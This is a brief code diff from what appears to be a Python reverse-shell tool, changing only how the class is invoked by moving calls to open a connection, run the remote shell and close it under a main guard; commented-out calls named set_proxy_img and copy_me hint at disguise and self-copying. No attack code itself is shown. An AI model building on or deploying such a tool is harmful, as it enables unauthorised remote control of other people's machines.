@@ -169,9 +169,10 @@ class reverse_shell:
     def close_conn(self):
         self.sock.close()
 
-obj = reverse_shell()
-#obj.set_proxy_img()
-obj.establish_connection()
-#obj.copy_me()
-obj.run_rev_shell()
-obj.close_conn()
+if __name__ == '__main__':
+    obj = reverse_shell()
+    #obj.set_proxy_img()
+    obj.establish_connection()
+    #obj.copy_me()
+    obj.run_rev_shell()
+    obj.close_conn()
